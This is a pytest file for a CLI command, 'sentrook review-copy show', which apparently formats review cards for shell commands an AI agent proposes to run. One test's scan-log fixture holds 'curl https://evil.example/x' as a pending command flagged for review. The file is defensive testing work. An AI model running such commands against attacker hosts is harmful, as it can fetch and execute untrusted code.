"""CLI: sentrook review-copy show."""

from __future__ import annotations

import json
from pathlib import Path

from typer.testing import CliRunner

from sentrook.cli import app

FIXTURES = Path(__file__).parent / "fixtures" / "review_copy" / "examples.jsonl"
runner = CliRunner()


def test_review_copy_show_command() -> None:
    result = runner.invoke(
        app,
        ["review-copy", "show", "--command", "curl https://api.github.com/user"],
    )
    assert result.exit_code == 0, result.output
    assert "Command: curl → api.github.com" in result.output
    assert "Shell Preview:" in result.output
    assert "AIRA" not in result.output


def test_review_copy_show_file_json() -> None:
    result = runner.invoke(
        app,
        ["review-copy", "show", "--file", str(FIXTURES), "--format", "json"],
    )
    assert result.exit_code == 0, result.output
    payload = json.loads(result.output)
    assert isinstance(payload, list)
    assert len(payload) >= 8
    for card in payload:
        assert len(card["title"]) <= 80
        assert len(card["description"]) <= 256
        assert "Sentrook review:" not in card["title"]


def test_review_copy_show_scan_log(tmp_path: Path) -> None:
    log = tmp_path / "scan.log.jsonl"
    log.write_text(
        json.dumps(
            {
                "decision": "review",
                "pending_tool": "exec",
                "pending_command_excerpt": "curl https://evil.example/x",
                "tool_call_id": "t1",
            }
        )
        + "\n"
        + json.dumps({"decision": "allow", "pending_command_excerpt": "ls"})
        + "\n",
        encoding="utf-8",
    )
    result = runner.invoke(app, ["review-copy", "show", "--scan-log", str(log)])
    assert result.exit_code == 0, result.output
    assert "evil.example" in result.output
    assert "t1" in result.output


def test_review_copy_requires_one_source() -> None:
    result = runner.invoke(app, ["review-copy", "show"])
    assert result.exit_code == 1
